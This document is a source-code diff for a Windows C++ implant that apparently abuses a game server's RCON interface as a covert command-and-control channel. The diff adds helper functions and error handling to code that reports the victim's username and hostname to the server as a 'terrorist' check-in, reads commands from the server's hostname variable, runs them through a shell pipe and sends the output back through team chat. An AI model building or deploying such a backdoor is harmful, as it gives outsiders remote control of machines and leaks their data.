@@ -14,6 +14,20 @@
 
 #pragma comment(lib, "ws2_32.lib")
 
+#define RCON_PACKET(challenge, command) "rcon " + challenge + " " + RCON_PASS + " " + command
+
+void
+getUserInfo(
+    char* hostname, 
+    char* username
+)
+{
+    gethostname(hostname, 256);
+
+    DWORD username_len = 256;
+    GetUserNameA(username, &username_len);
+}
+
 std::string 
 exec(
     const std::string& cmd
@@ -22,10 +36,12 @@ exec(
     std::array<char, 128> buffer;
     std::string result;
     std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
-    if (!pipe) {
+    if (!pipe) 
+    {
         throw std::runtime_error("popen() failed!");
     }
-    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) 
+    {
         result += buffer.data();
     }
     return result;
@@ -41,16 +57,23 @@ getRconChallenge(
     const char* command = "getchallenge";
     char rconCommand[256];
     sprintf_s(rconCommand, sizeof(rconCommand), "\xFF\xFF\xFF\xFF%s", command);
-    sendto(s, rconCommand, (int)strlen(rconCommand), 0, (struct sockaddr*)&serverAddress, sizeof(struct sockaddr_in));
+    int result = sendto(s, rconCommand, (int)strlen(rconCommand), 0, (struct sockaddr*)&serverAddress, sizeof(struct sockaddr_in));
+
+    if (result == SOCKET_ERROR)
+    {
+        closesocket(s);
+        return "";
+    }
 
     // Receive UDP response
-    char buffer[48]; // sizeof challenge response
+    char buffer[48] = {}; // sizeof challenge response
     int bytesReceived = recv(s, buffer, sizeof(buffer), 0);
 
     closesocket(s);
 
     // extract challenge from e.g. A00000000 1574936798 3 90179819134315537 1
-    return std::string(buffer).substr(14, 9);
+    auto challengeResponse = std::string(buffer);
+    return challengeResponse.size() < 23 ? "" : challengeResponse.substr(14, 9);
 }
 
 std::string
@@ -62,7 +85,7 @@ getHostnameFromCVARS(
 
     SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
     
-    std::string command = "rcon " + challenge + " " + RCON_PASS + " " + "status";
+    std::string command = RCON_PACKET(challenge, "status");
 
     char rconCommand[255];
     sprintf_s(rconCommand, sizeof(rconCommand), "\xFF\xFF\xFF\xFF%s", command.c_str());
@@ -82,6 +105,21 @@ getHostnameFromCVARS(
 
     return line.substr(16, line.length() - 16); // 16 = prefix length
 
+}
+
+void 
+sendSayPacket(
+    const SOCKET& s,
+    const sockaddr_in& serverAddress, 
+    const std::string& challenge, 
+    const std::string& message
+)
+{
+    std::string command = RCON_PACKET(challenge, "say_team " + message);
+    std::cout << "[*] Sending RCON command - " << command << std::endl;
+    char rconCommand[1024];
+    sprintf_s(rconCommand, sizeof(rconCommand), "\xFF\xFF\xFF\xFF%s", command.c_str());
+    sendto(s, rconCommand, (int)strlen(rconCommand), 0, (struct sockaddr*)&serverAddress, sizeof(struct sockaddr_in));
 }
 
 int 
@@ -106,22 +144,27 @@ main()
 
     // Request challenge for RCON authentication
     std::string challenge = getRconChallenge(serverAddress);
+
+    if (challenge.empty())
+    {
+        std::cerr << "[!] No RCON challenge received...\n";
+        std::cout << "[!] Exiting..." << std::endl;
+        WSACleanup();
+        return 1;
+    }
+
     std::cout << "[*] Received RCON challenge: " << challenge << std::endl;
 
     // Check in to server
+    char hostname[256] = { 0 }; char username[256] = { 0 };
+    getUserInfo(hostname, username);
+
+    std::string checkinMessage = "\"[*] New terrorist checked in: " + std::string(username) + "@" + std::string(hostname) + "\"";
     SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
-    char hostname[256] = { 0 };
-    gethostname(hostname, 256);
-    char username[256];
-    DWORD username_len = 256;
-    GetUserNameA(username, &username_len);
-    std::string checkin = "rcon " + challenge + " " + RCON_PASS + " say \"[*] New terrorist checked in: " + std::string(username) + "@" + std::string(hostname) + "\"";
-    std::cout << "[*] Sending RCON command - " << checkin << std::endl;
-    char rconCheckinCommand[1024];
-    sprintf_s(rconCheckinCommand, sizeof(rconCheckinCommand), "\xFF\xFF\xFF\xFF%s", checkin.c_str());
-    sendto(s, rconCheckinCommand, (int)strlen(rconCheckinCommand), 0, (struct sockaddr*)&serverAddress, sizeof(struct sockaddr_in));
-    std::cout << "[*] Checked in to server @ " << SERVER_IP << ":" << SERVER_PORT << std::endl;
+    sendSayPacket(s, serverAddress, challenge, checkinMessage);
     closesocket(s);
+
+    std::cout << "[*] Checked in to server @ " << SERVER_IP << ":" << SERVER_PORT << std::endl;
 
     // Get current server hostname
     std::string lastCommand = getHostnameFromCVARS(serverAddress, challenge);
@@ -141,19 +184,16 @@ main()
 
             // Send answer to chat, line by line
             s = socket(AF_INET, SOCK_DGRAM, 0);
-            
             std::istringstream iss(result);
             std::string line;
             while (std::getline(iss, line))
             {
-                std::string command = "rcon " + challenge + " " + RCON_PASS + " " + "say_team " + line;
-                std::cout << "[*] Sending RCON command - " << command << std::endl;
-                char rconCommand[1024];
-                sprintf_s(rconCommand, sizeof(rconCommand), "\xFF\xFF\xFF\xFF%s", command.c_str());
-                sendto(s, rconCommand, (int)strlen(rconCommand), 0, (struct sockaddr*)&serverAddress, sizeof(struct sockaddr_in));
-                Sleep(1000);
+                if (!line.empty())
+                {
+                    sendSayPacket(s, serverAddress, challenge, line);
+                    Sleep(1000);
+                }
             }
-
             closesocket(s);
         }
         
